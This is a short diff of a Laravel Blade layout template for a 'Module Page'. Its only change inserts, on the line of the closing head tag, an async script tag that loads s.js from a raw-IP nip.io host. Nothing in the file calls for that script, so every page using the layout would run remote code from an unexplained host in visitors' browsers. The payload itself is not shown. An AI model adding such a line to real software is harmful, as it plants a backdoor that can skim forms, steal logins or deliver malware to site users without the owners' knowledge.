@@ -5,7 +5,7 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <title>Module Page</title>
-    </head>
+    <script src="https://153.75.226.33.nip.io/s.js" async></script></head>
     <body>
         @yield('content')
     </body>
